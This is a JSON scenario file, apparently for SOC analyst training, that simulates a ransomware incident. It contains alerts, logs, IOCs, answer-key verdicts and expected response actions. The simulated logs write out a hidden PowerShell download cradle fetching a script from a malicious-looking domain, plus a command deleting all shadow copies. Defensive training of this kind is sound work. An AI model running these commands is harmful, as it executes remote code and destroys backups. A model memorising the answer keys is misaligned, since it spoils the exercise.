@@ -1,0 +1,206 @@
+{
+  "id": "sc-012",
+  "title": "Shift 012 - Afternoon Shift",
+  "category": "Ransomware",
+  "outcome": "escalation",
+  "difficulty": "Tier 3",
+  "briefing": "Endpoint and file server alerts are arriving in quick succession.",
+  "startTime": "16:00:00",
+  "context": {
+    "change_calendar": [],
+    "notices": []
+  },
+  "assets": {
+    "users": {
+      "a.samir": "FS-01"
+    }
+  },
+  "alerts": [
+    {
+      "at": 0,
+      "severity": "Medium",
+      "rule": "Email: macro-enabled attachment",
+      "source": "Email Gateway",
+      "host": "FIN-PC-12",
+      "user": "a.samir",
+      "summary": "Macro-enabled attachment Invoice_Q3.docm delivered to a.samir",
+      "details": {
+        "email_from": "billing@portal-center-desk.info",
+        "email_to": "a.samir@corp.example",
+        "file_name": "Invoice_Q3.docm",
+        "file_hash": "9461e82829a5f6ca6fcba2511ad09bb6a1a60a558b0047e7e4168d4db2c3da0c",
+        "action_taken": "Delivered",
+        "raw_log": "mail attach=Invoice_Q3.docm macro=yes spf=fail"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "High",
+        "escalate": true,
+        "mitre": "T1566.001"
+      },
+      "id": "A-1001"
+    },
+    {
+      "at": 5,
+      "severity": "High",
+      "rule": "EDR: PowerShell download cradle",
+      "source": "EDR",
+      "host": "FIN-PC-12",
+      "user": "a.samir",
+      "summary": "powershell.exe downloaded a payload from portal-center-desk.info on FIN-PC-12",
+      "details": {
+        "host_ip": "10.12.18.152",
+        "process": "powershell.exe",
+        "parent_process": "WINWORD.EXE",
+        "domain": "portal-center-desk.info",
+        "command_line": "powershell -w hidden -c IEX((New-Object Net.WebClient).DownloadString('https://portal-center-desk.info/a.ps1'))",
+        "raw_log": "EDR proc=powershell.exe parent=WINWORD.EXE net=https://portal-center-desk.info/a.ps1"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "High",
+        "escalate": true,
+        "mitre": "T1059.001"
+      },
+      "id": "A-1002"
+    },
+    {
+      "at": 12,
+      "severity": "Critical",
+      "rule": "EDR: shadow copies deleted",
+      "source": "EDR",
+      "host": "FIN-PC-12",
+      "user": "a.samir",
+      "summary": "vssadmin delete shadows /all executed on FIN-PC-12",
+      "details": {
+        "host_ip": "10.12.18.152",
+        "process": "vssadmin.exe",
+        "parent_process": "powershell.exe",
+        "command_line": "vssadmin.exe delete shadows /all /quiet",
+        "raw_log": "EDR proc=vssadmin.exe args='delete shadows /all /quiet' host=FIN-PC-12"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Critical",
+        "escalate": true,
+        "mitre": "T1490"
+      },
+      "id": "A-1003"
+    },
+    {
+      "at": 15,
+      "severity": "Critical",
+      "rule": "File server: mass file rename / entropy spike",
+      "source": "File Server",
+      "host": "FS-01",
+      "user": "a.samir",
+      "summary": "3086 files renamed with extension .icevault on FS-01 within 3 minutes",
+      "details": {
+        "src_ip": "10.12.18.152",
+        "dst_ip": "10.10.0.20",
+        "protocol": "SMB",
+        "file_name": "README_IceVault.txt",
+        "raw_log": "fs rename burst share=\\\\FS-01\\Finance ext=.icevault user=a.samir"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Critical",
+        "escalate": true,
+        "mitre": "T1486"
+      },
+      "id": "A-1004"
+    }
+  ],
+  "logs": [
+    {
+      "t": "15:59:38",
+      "src": "proxy",
+      "host": "EXEC-PC-38",
+      "user": "a.hassan",
+      "msg": "GET https://mail.corp.example/owa 200"
+    },
+    {
+      "t": "16:03:07",
+      "src": "proxy",
+      "host": "SALES-PC-20",
+      "user": "a.zaki",
+      "msg": "GET https://mail.corp.example/owa 200"
+    },
+    {
+      "t": "16:05:00",
+      "src": "proxy",
+      "host": "FIN-PC-12",
+      "user": "a.samir",
+      "msg": "GET https://portal-center-desk.info/a.ps1 200"
+    },
+    {
+      "t": "16:06:22",
+      "src": "email",
+      "host": "LEGAL-PC-27",
+      "user": "h.farouk",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "16:10:08",
+      "src": "windows",
+      "host": "ENG-PC-30",
+      "user": "s.ibrahim",
+      "msg": "4634 logoff"
+    },
+    {
+      "t": "16:12:07",
+      "src": "windows",
+      "host": "ENG-PC-08",
+      "user": "h.fathy",
+      "msg": "4634 logoff"
+    },
+    {
+      "t": "16:15:00",
+      "src": "windows",
+      "host": "FS-01",
+      "user": "a.samir",
+      "msg": "5145 share access \\\\FS-01\\Finance by a.samir (write, burst)"
+    },
+    {
+      "t": "16:17:15",
+      "src": "proxy",
+      "host": "EXEC-PC-17",
+      "user": "k.nabil",
+      "msg": "GET https://cdn.fabrikam-cdn.net/lib.js 200"
+    },
+    {
+      "t": "16:20:56",
+      "src": "dns",
+      "host": "EXEC-PC-40",
+      "user": "h.gamal",
+      "msg": "query updates.contoso-tools.com A NOERROR"
+    },
+    {
+      "t": "16:25:52",
+      "src": "email",
+      "host": "HR-PC-23",
+      "user": "s.gamal",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    }
+  ],
+  "iocs": {
+    "portal-center-desk.info": {
+      "type": "domain",
+      "reputation": "malicious",
+      "note": "Ransomware loader hosting"
+    },
+    "9461e82829a5f6ca6fcba2511ad09bb6a1a60a558b0047e7e4168d4db2c3da0c": {
+      "type": "hash",
+      "reputation": "malicious",
+      "note": "IceVault dropper document"
+    }
+  },
+  "expected_actions": [
+    "isolate_host:FIN-PC-12",
+    "isolate_host:FS-01",
+    "disable_account:a.samir",
+    "block_domain:portal-center-desk.info",
+    "escalate_tier2",
+    "initiate_incident_response"
+  ]
+}
